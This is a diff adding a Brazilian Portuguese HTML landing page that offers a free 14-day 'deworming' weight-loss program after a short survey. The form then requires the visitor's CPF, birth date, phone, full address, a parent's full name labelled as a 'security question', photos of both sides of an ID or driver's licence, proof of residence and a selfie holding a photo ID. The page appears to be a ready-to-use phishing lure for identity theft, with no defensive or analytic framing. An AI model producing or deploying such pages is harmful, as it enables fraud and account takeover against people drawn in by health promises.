@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <link rel="stylesheet" href="style.css">
+    <title>Formulário</title>
+</head>
+
+<body>
+   
+
+    <div class="container">
+
+    
+
+        <div class="top">
+            <h3>Faça o Cadastro e Receba o Programa Desparasitação em 14 dias 100% Gratuito</h3>
+            <p>Apenas preencha o formulário e <br>responda nossa pesquisa</p>
+
+            <div class="image">
+                <img src="expert.png">
+            </div>
+
+            <div class="divider">
+                <div class="line"></div>
+                <div class="line"></div>
+            </div>
+        </div>
+
+        <h1>Responda nossa breve pesquisa e preencha seus dados</h1>     
+    
+
+        <div class="ask">
+
+            <div class="one">
+                <h4>Quantos quilos você deseja perder?</h4>
+                <div class="box">
+                    <input type="checkbox" name="ask1">
+                    <label for="ask">de 3 a 7 quilos</label>
+                </div>
+                <div class="box">
+                    <input type="checkbox" name="ask2">
+                    <label for="ask">de 7 a 12 quilos</label>
+                </div>
+                <div class="box">
+                    <input type="checkbox" name="ask3">
+                    <label for="ask">mais de 12 quilos</label>
+                </div>
+            </div>   
+
+            <div class="two">
+                <h4>Qual sua maior dificuldade para perder peso?</h4>
+                <div class="box">
+                    <input type="checkbox" name="ask1">
+                    <label for="ask">Falta de conhecimento sobre o que fazer</label>
+                </div>
+                <div class="box">
+                    <input type="checkbox" name="ask2">
+                    <label for="ask">Desistir após ver poucos resultados</label>
+                </div>
+                <div class="box">
+                    <input type="checkbox" name="ask3">
+                    <label for="ask">Falta de suporte ou acompanhamento</label>
+                </div>
+            </div>
+
+            <div class="three">
+                <h4>Como você se sente com o seu peso atual?</h4>
+                <div class="box">
+                    <input type="checkbox" name="ask1">
+                    <label for="ask">Insatisfeita e preocupada</label>
+                </div>
+                <div class="box">
+                    <input type="checkbox" name="ask2">
+                    <label for="ask">Moderadamente satisfeita</label>
+                </div>
+                <div class="box">
+                    <input type="checkbox" name="ask3">
+                    <label for="ask">Completamente satisfeita</label>
+                </div>
+            </div>
+
+        </div>
+
+        <h1>
+            Agradecemos a sua participação!
+            <br><br>
+            Preencha seus dados para receber o Programa Desparasitação em 14 dias 100% Gratuito!
+        </h1> 
+        <br>
+
+        <form>
+
+            <label for="nome">Digite seu nome completo:</label>
+            <div class="custome-input">
+                <input type="text" name="nome" placeholder="Seu Nome Completo" autocomplete="off" required>
+                <i class='bx bx-user'></i>
+            </div>
+
+            <label for="data">Digite a data do seu aniversário:</label>
+            <div class="custome-input">
+                <input type="number" name="data" placeholder="dia / mês / ano" autocomplete="off" required>
+                <i class='bx bx-calendar'></i>
+            </div>
+
+            <label for="cpf">Digite seu CPF:</label>
+            <div class="custome-input">
+                <input type="number" name="cpf" placeholder="000.000.000-00" autocomplete="off" required>
+                <i class='bx bx-lock-alt'></i>
+            </div>
+
+            <label for="celular">Digite o Número Celular com DDD:</label>
+            <div class="custome-input">
+                <input type="number" name="celular" placeholder="(99) 9 9999-9999" required>
+                <i class='bx bx-phone-call'></i>
+            </div>
+
+            <br><br>
+
+            <label for="cidade">Cidade:</label>
+            <div class="custome-input">
+                <input type="text" name="cidade" placeholder="Digite sua Cidade" required>
+                <i class='bx bx-building-house'></i>
+            </div>
+
+            <label for="estado">Estado:</label>
+            <div class="custome-input">
+                <input type="text" name="estado" placeholder="Digite seu Estado" required>
+                <i class='bx bx-building-house'></i>
+            </div>
+
+            <label for="bairro">Bairro:</label>
+            <div class="custome-input">
+                <input type="text" name="bairro" placeholder="Digite seu Bairro" required>
+                <i class='bx bx-building-house'></i>
+            </div>
+
+            <label for="endereco">Rua:</label>
+            <div class="custome-input">
+                <input type="text" name="rua" placeholder="Digite sua Rua" required>
+                <i class='bx bx-building-house'></i>
+            </div>
+
+            <label for="numero">Número do seu Endereço:</label>
+            <div class="custome-input">
+                <input type="number" name="numero" placeholder="Digite o Número do seu endereço" required>
+                <i class='bx bx-building-house'></i>
+            </div>
+
+            <br>
+            <br>
+            <h2>Pergunta de Segurança!</h2>
+            <label for="pai">Digite o nome Completo do seu Pai ou Mãe:</label>
+            <div class="custome-input">
+                <input type="text" name="pai" placeholder="Nome Completo do seu Pai ou Mãe" required>
+                <i class='bx bx-lock-alt'></i>
+            </div>
+
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <h2>Confirme que você é uma pessoa real:</h2>
+
+            <label for="photo">Envie uma foto da sua Identidade ou CNH (FRENTE!):</label>
+            <input type="file" id="photo" name="photo" accept="image/*" required><br><br>
+
+            <label for="photo">Envie uma foto da sua Identidade ou CNH (VERSO!):</label>
+            <input type="file" id="photo" name="photo" accept="image/*" required><br><br>
+
+            <label for="photo">Envie uma foto do seu comprovante de Residência:</label>
+            <input type="file" id="photo" name="photo" accept="image/*" required><br><br>
+
+            <label for="photo">Envie uma selvie segurando um documento com foto:</label>
+            <input type="file" id="photo" name="photo" accept="image/*" required><br><br>
+
+            <button class="login">Enviar</button>
+
+            
+        </form>
+
+    </div>
+
+    
+</body>
+</html>
